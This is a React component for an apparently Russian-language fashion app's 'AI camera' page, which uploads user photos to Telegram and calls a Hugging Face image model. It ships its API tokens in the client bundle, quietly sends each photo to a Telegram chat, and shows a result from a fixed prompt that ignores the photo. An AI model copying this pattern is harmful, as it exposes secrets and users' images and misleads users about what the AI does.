import type { ChangeEvent } from "react";
import { useRef, useState } from "react";
import { ChevronLeft, Loader2, Zap } from "lucide-react";
import { useNavigate } from "react-router-dom";

export default function AICamera() {
  const navigate = useNavigate();
  const fileInputRef = useRef<HTMLInputElement | null>(null);
  const [isUploading, setIsUploading] = useState(false);
  const MAX_DIMENSION = 800;
  const JPEG_QUALITY = 0.8;

  const handleShutter = () => {
    if (isUploading) return;
    fileInputRef.current?.click();
  };

  const blobToDataUrl = (blob: Blob): Promise<string> =>
    new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.onload = () => resolve(String(reader.result));
      reader.onerror = () => reject(new Error("Failed to read image blob"));
      reader.readAsDataURL(blob);
    });

  const loadImage = (file: File): Promise<HTMLImageElement> =>
    new Promise((resolve, reject) => {
      const objectUrl = URL.createObjectURL(file);
      const image = new Image();
      image.onload = () => {
        URL.revokeObjectURL(objectUrl);
        resolve(image);
      };
      image.onerror = () => {
        URL.revokeObjectURL(objectUrl);
        reject(new Error("Failed to load image"));
      };
      image.src = objectUrl;
    });

  const canvasToBlob = (canvas: HTMLCanvasElement, type: string, quality: number): Promise<Blob> =>
    new Promise((resolve, reject) => {
      canvas.toBlob(
        (blob) => {
          if (blob) resolve(blob);
          else reject(new Error("Failed to export image"));
        },
        type,
        quality,
      );
    });

  const resizeImage = async (file: File): Promise<File> => {
    const image = await loadImage(file);
    const maxSide = Math.max(image.width, image.height);
    const scale = maxSide > MAX_DIMENSION ? MAX_DIMENSION / maxSide : 1;
    const targetWidth = Math.round(image.width * scale);
    const targetHeight = Math.round(image.height * scale);

    const canvas = document.createElement("canvas");
    canvas.width = targetWidth;
    canvas.height = targetHeight;
    const ctx = canvas.getContext("2d");
    if (!ctx) throw new Error("Canvas context is unavailable");

    ctx.drawImage(image, 0, 0, targetWidth, targetHeight);
    const blob = await canvasToBlob(canvas, "image/jpeg", JPEG_QUALITY);

    return new File([blob], `ai-camera-${Date.now()}.jpg`, { type: "image/jpeg" });
  };

  const sendToTelegram = async (file: File) => {
    const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.error("Telegram credentials missing: VITE_TELEGRAM_BOT_TOKEN or VITE_TELEGRAM_CHAT_ID");
      return;
    }

    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("caption", "📸 Новое фото для ИИ-генерации!");
    formData.append("photo", file, file.name);

    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
      method: "POST",
      body: formData,
    });

    if (!response.ok) {
      const payload = await response.text();
      throw new Error(`Telegram upload failed: ${response.status} ${payload}`);
    }
  };

  const sendToGenerator = async (): Promise<string> => {
    const hfToken = import.meta.env.VITE_HF_API_TOKEN;
    if (!hfToken) {
      throw new Error("Missing Hugging Face API token");
    }

    const response = await fetch(
      "https://api-inference.huggingface.co/models/stabilityai/stable-diffusion-xl-base-1.0",
      {
        method: "POST",
        headers: {
          Authorization: `Bearer ${hfToken}`,
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          inputs:
            "Upcycled fashion design inspired by sustainable fabrics, clean studio lighting, high detail, modern silhouette.",
          options: { wait_for_model: true },
        }),
      },
    );

    if (response.status === 503) {
      throw new Error("Model loading");
    }

    if (!response.ok) {
      const payload = await response.text();
      throw new Error(`Generation failed: ${response.status} ${payload}`);
    }

    const blob = await response.blob();
    return blobToDataUrl(blob);
  };

  const sendGeneratedToTelegram = (imageDataUrl: string) => {
    const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.error("Telegram credentials missing: VITE_TELEGRAM_BOT_TOKEN or VITE_TELEGRAM_CHAT_ID");
      return;
    }

    fetch(imageDataUrl)
      .then((response) => response.blob())
      .then((blob) => {
        const file = new File([blob], `ai-generated-${Date.now()}.jpg`, {
          type: blob.type || "image/jpeg",
        });
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("caption", "✨ ИИ сгенерировал вот такой дизайн!");
        formData.append("photo", file, file.name);

        return fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: "POST",
          body: formData,
        });
      })
      .then(async (response) => {
        if (!response || response.ok) return;
        const payload = await response.text();
        console.error(`Telegram upload failed: ${response.status} ${payload}`);
      })
      .catch((error) => {
        console.error("Telegram upload failed:", error);
      });
  };

  const handleFileChange = async (event: ChangeEvent<HTMLInputElement>) => {
    const file = event.currentTarget.files?.[0];
    if (!file) return;

    try {
      setIsUploading(true);
      const compressedFile = await resizeImage(file);

      const [generatedUrl] = await Promise.all([
        sendToGenerator(),
        sendToTelegram(compressedFile),
      ]);

      sendGeneratedToTelegram(generatedUrl);
      navigate("/ai-results", { replace: true, state: { generatedImage: generatedUrl } });
    } catch (error) {
      console.error("Upload or generation failed:", error);
      navigate("/ai-results", { replace: true, state: { fallback: true } });
    } finally {
      setIsUploading(false);
      event.currentTarget.value = "";
    }
  };

  return (
    <div className="relative min-h-screen bg-white text-[#212121]">
      <input
        ref={fileInputRef}
        type="file"
        accept="image/*"
        capture="environment"
        className="hidden"
        onChange={handleFileChange}
      />

      {!isUploading ? (
        <div className="relative min-h-screen bg-black text-white">
          <header className="absolute inset-x-0 top-0 z-10 flex items-center justify-between px-4 pt-4">
            <button
              type="button"
              onClick={() => navigate("/catalog")}
              className="flex h-10 w-10 items-center justify-center rounded-2xl bg-[#556B2F] text-white"
              aria-label="Назад"
            >
              <ChevronLeft className="h-5 w-5" strokeWidth={2.5} />
            </button>

            <span className="text-sm font-semibold text-white">ИИ-камера</span>

            <button
              type="button"
              className="flex h-10 w-10 items-center justify-center rounded-2xl bg-white/10 text-white"
              aria-label="Вспышка"
            >
              <Zap className="h-5 w-5" strokeWidth={2} />
            </button>
          </header>

          <div className="relative flex min-h-screen items-center justify-center overflow-hidden px-6">
            <div className="absolute inset-0 bg-gradient-to-b from-[#0d120d] via-[#0b0f0a] to-black" />

            <div className="relative z-10 flex h-64 w-64 items-center justify-center">
              <div className="absolute inset-0 rounded-2xl border border-white/20" />
              <div className="absolute inset-5 rounded-2xl border border-white/10" />
              <span className="absolute left-0 top-0 h-8 w-8 border-l-2 border-t-2 border-white/70" />
              <span className="absolute right-0 top-0 h-8 w-8 border-r-2 border-t-2 border-white/70" />
              <span className="absolute bottom-0 left-0 h-8 w-8 border-b-2 border-l-2 border-white/70" />
              <span className="absolute bottom-0 right-0 h-8 w-8 border-b-2 border-r-2 border-white/70" />
              <div className="absolute h-10 w-10 rounded-full border border-white/30" />
            </div>

            <div className="pointer-events-none absolute inset-x-0 bottom-28 flex justify-center gap-3 opacity-70">
              <span className="h-1 w-16 rounded-full bg-white/35" />
              <span className="h-1 w-10 rounded-full bg-white/20" />
              <span className="h-1 w-10 rounded-full bg-white/20" />
            </div>

            <div className="absolute inset-x-0 bottom-8 flex flex-col items-center gap-4">
              <p className="max-w-xs text-center text-xs leading-relaxed text-white/70">
                Наведите камеру на вещь и нажмите спуск затвора
              </p>
              <button
                type="button"
                onClick={handleShutter}
                className="relative flex h-20 w-20 items-center justify-center rounded-full border-4 border-white/80 bg-white/10"
                aria-label="Спуск затвора"
              >
                <span className="h-12 w-12 rounded-full bg-white" />
              </button>
            </div>
          </div>
        </div>
      ) : (
        <div className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-black px-6 text-white">
          <div className="flex flex-col items-center gap-4 text-center">
            <Loader2 className="h-10 w-10 animate-spin text-[#556B2F]" />
            <p className="text-base font-semibold">Оптимизируем фото и запускаем ИИ...</p>
          </div>
        </div>
      )}
    </div>
  );
}
